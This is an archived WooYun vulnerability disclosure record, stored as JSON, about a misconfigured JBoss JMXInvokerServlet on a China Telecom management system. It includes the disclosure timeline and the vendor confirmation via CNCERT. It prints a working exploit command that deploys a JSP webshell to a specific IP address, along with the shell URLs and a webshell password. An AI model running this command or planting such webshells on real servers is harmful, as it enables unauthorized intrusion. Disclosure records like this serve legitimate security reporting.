{"id": 32000, "wybug_id": "wooyun-2015-0112518", "wybug_title": "中国电信某管理系统jboss配置不当导致getshell", "wybug_corp": "中国电信", "wybug_author": "路人甲", "wybug_date": "2015-05-07 09:37", "wybug_open_date": "2015-06-25 13:30", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向公众公开  简要描述： 由于该系统的jboss配置不当导致getshell，注意不是struts2命令执行 详细说明：  首先和审核的领导汇报，真的没有和 WooYun: 中国电信某管理系统存在Struts2命令执行漏洞 冲突，我提的是jboss配置不当导致的命令执行，而不是该洞中提出的struts2命令执行中国电信C3TI终端互联管理系统地址：http://180.168.201.42:8080/c3tidms/dms/login.action  \n\n 问题原因是由于该系统的jboss配置不当，导致可以通过http://180.168.201.42:8080/invoker/JMXInvokerServlet拿到getshell\n\n\n\n   漏洞证明：  \njava -jar jboss_exploit_fat.jar -i http://180.168.201.42:8080/invoker/JMXInvokerServlet invoke jboss.admin:service=DeploymentFileRepository store myname.war woo .jsp $content$ true -s java.lang.String;java.lang.String;java.lang.String;java.lang.String;java.lang.Boolean\n小马：http://180.168.201.42:8080/myname/wooy.jsp\n\n一句话地址：http://180.168.201.42:8080/myname/wooyun0506.jsp密码：woo0yun\n\n\n\n   修复方案：  正确配置jboss   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-05-11 13:28 厂商回复： CNVD确认所述情况，已经转由CNCERT向中国电信通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}